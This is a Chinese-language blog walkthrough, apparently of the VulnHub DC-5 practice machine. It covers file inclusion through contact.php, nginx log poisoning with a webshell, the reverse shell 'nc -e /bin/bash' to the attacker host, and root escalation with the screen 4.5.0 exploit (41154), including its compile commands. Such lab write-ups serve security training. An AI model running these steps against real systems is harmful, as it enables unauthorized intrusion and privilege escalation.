@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Nayst"><meta name="copyright" content="Nayst"><meta name="generator" content="Hexo 6.2.0"><meta name="theme" content="hexo-theme-yun"><title>VulnHub-DC-5 | Nayst-Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/images/Doge.svg"><link rel="mask-icon" href="/images/Doge.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"www.nayst.top","root":"/","title":["Nayst","的","小","站"],"version":"1.10.6","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="介绍在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。 靶机：192.168.254.134（DC-5） 攻击机：192.168.254.128（Kali） 物理机：192.168.254.1（Windows10） 信息搜集nmap扫描靶机   成功扫描到目标靶机，开放了两个端口。 80端口存在http服务。   漏洞扫描无框架等信息，只知道由">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-DC-5">
+<meta property="og:url" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/index.html">
+<meta property="og:site_name" content="Nayst-Blog">
+<meta property="og:description" content="介绍在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。 靶机：192.168.254.134（DC-5） 攻击机：192.168.254.128（Kali） 物理机：192.168.254.1（Windows10） 信息搜集nmap扫描靶机   成功扫描到目标靶机，开放了两个端口。 80端口存在http服务。   漏洞扫描无框架等信息，只知道由">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220420170303776.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421133647164.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220420170159039.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421133940967.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421134021953.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421134124451.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421134340815.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421134527981.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421134845639.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421135146296.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421135616859.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421135854083.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220420170215484.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421144325278.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421144637143.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421145410320.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421145515037.png">
+<meta property="og:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220421145559822.png">
+<meta property="article:published_time" content="2022-04-20T03:06:22.000Z">
+<meta property="article:modified_time" content="2022-07-31T08:46:17.290Z">
+<meta property="article:author" content="Nayst">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.nayst.top/2022/04/20/VulnHub-DC-5/image-20220420170303776.png"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="努力做一个对社会有贡献的人">🤣</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-Blog</span><sub class="site-subtitle">远离舒适圈</sub><div class="site-description">已入江湖，未配良剑</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">17</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">6</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="2495582918" target="_blank" style="color:#007722"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/1579790" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/jizhideyunyoujun" title="微博" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=277777144" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="我的老婆们" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">漏洞扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag"><span class="toc-number">5.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">6.1.</span> <span class="toc-text">学到的知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://www.nayst.top/2022/04/20/VulnHub-DC-5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">VulnHub-DC-5</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-04-20 11:06:22" itemprop="dateCreated datePublished" datetime="2022-04-20T11:06:22+08:00">2022-04-20</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2022-07-31 16:46:17" itemprop="dateModified" datetime="2022-07-31T16:46:17+08:00">2022-07-31</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">599</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">2m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">渗透测试</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E9%9D%B6%E5%9C%BA/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">靶场</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
+<p>靶机：192.168.254.134（<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">DC-5</a>）</p>
+<p>攻击机：192.168.254.128（Kali）</p>
+<p>物理机：192.168.254.1（Windows10）</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>nmap</code>扫描靶机</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220420170303776.png" class="" title="image-20220420170303776" loading="lazy">
+
+<p>成功扫描到目标靶机，开放了两个端口。</p>
+<p>80端口存在http服务。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421133647164.png" class="" title="image-20220421133647164" loading="lazy">
+
+<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>无框架等信息，只知道由Nginx反向代理，先扫目录。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220420170159039.png" class="" title="image-20220420170159039" loading="lazy">
+
+<p>未发现隐藏目录，只能从页面下手了。</p>
+<p><code>contact.php</code>页面存在提交，可能存在注入。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421133940967.png" class="" title="image-20220421133940967" loading="lazy">
+
+<p>尝试后发现无注入，但是提交后的页面页脚一直在变，可能存在文件包含。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421134021953.png" class="" title="image-20220421134021953" loading="lazy">
+
+<p>经测试，存在隐藏字段<code>file</code>可以包含文件。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421134124451.png" class="" title="image-20220421134124451" loading="lazy">
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>尝试伪协议写文件，失败。</p>
+<p>已知中间件为<code>nginx</code>，尝试读取日志文件。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421134340815.png" class="" title="image-20220421134340815" loading="lazy">
+
+<p>成功读取日志文件，写入木马。</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421134527981.png" class="" title="image-20220421134527981" loading="lazy">
+
+<p>成功执行！</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421134845639.png" class="" title="image-20220421134845639" loading="lazy">
+
+<p>反弹shell！</p>
+<p>在 <code>Kali</code> 上监听 <code>1234</code> 端口。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -lvnp <span class="token number">1234</span></code></pre>
+
+<p>在靶机上反弹shell。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.254.128 <span class="token number">1234</span></code></pre>
+
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421135146296.png" class="" title="image-20220421135146296" loading="lazy">
+
+<p>成功拿到shell！</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421135616859.png" class="" title="image-20220421135616859" loading="lazy">
+
+<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>先搞个交互式shell。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+
+<p>看看能不能提权。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>
+
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421135854083.png" class="" title="image-20220421135854083" loading="lazy">
+
+<p>发现了可疑文件，查找一下相关漏洞</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit <span class="token function">screen</span> <span class="token number">4.5</span>.0</code></pre>
+
+<img src="/2022/04/20/VulnHub-DC-5/image-20220420170215484.png" class="" title="image-20220420170215484" loading="lazy">
+
+<p>复制过来，上传到靶机上执行，报错</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421144325278.png" class="" title="image-20220421144325278" loading="lazy">
+
+<p>看看脚本怎么写的</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421144637143.png" class="" title="image-20220421144637143" loading="lazy">
+
+<p>可以分为三个部分：前两个部分为<code>c语言程序</code>，第三部分为<code>shell脚本</code></p>
+<p>结合错误分析，应该是前两个部分编译文件时出了问题，无法正常编译导致文件找不到</p>
+<p>因此只能在本地编译好后分开上传再执行</p>
+<p>先将前两个程序编译好</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+$ gcc -o /tmp/rootshell /tmp/rootshell.c</code></pre>
+
+<blockquote>
+<p>-fPIC 参数表明使用地址无关代码。</p>
+<p>-shared 参数表明产生共享库。</p>
+<p>-ldl 其中参数-l为连接一个共享库，dl表示名为libdl.a的静态库。</p>
+</blockquote>
+<p>在<code>/tmp</code>目录下会生成两个文件</p>
+<p>将第三部分作为一个单独的文件</p>
+<p>共三个文件，上传到靶机的<code>/tmp</code>目录下</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421145410320.png" class="" title="image-20220421145410320" loading="lazy">
+
+<p>给<code>41154.sh</code>添加执行权限并执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> +x <span class="token number">41154</span>.sh
+$ ./41154.sh</code></pre>
+
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421145515037.png" class="" title="image-20220421145515037" loading="lazy">
+
+<p>成功提权！</p>
+<p>成功拿到flag！</p>
+<img src="/2022/04/20/VulnHub-DC-5/image-20220421145559822.png" class="" title="image-20220421145559822" loading="lazy">
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的知识点"><a href="#学到的知识点" class="headerlink" title="学到的知识点"></a>学到的知识点</h2><ol>
+<li>敏感文件检索</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/kukudeshuo/article/details/118709469">vulnhub靶场，DC-5</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rpsate/article/details/119769130?spm=1001.2014.3001.5502">vulnhub DC5 靶场练习</a></li>
+</ol>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">竟然有用？！赏！</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/Alipay.png"><img loading="lazy" src="/images/Alipay.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a href="/images/WechatPay.png"><img loading="lazy" src="/images/WechatPay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Nayst</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.nayst.top/2022/04/20/VulnHub-DC-5/" title="VulnHub-DC-5">https://www.nayst.top/2022/04/20/VulnHub-DC-5/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/04/21/Python/" rel="prev" title="Python"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Python</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/04/13/Docker/" rel="next" title="Docker从0到1"><span class="post-nav-text">Docker从0到1</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Nayst</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.6</span></div><div class="live-time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-07-01T18:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
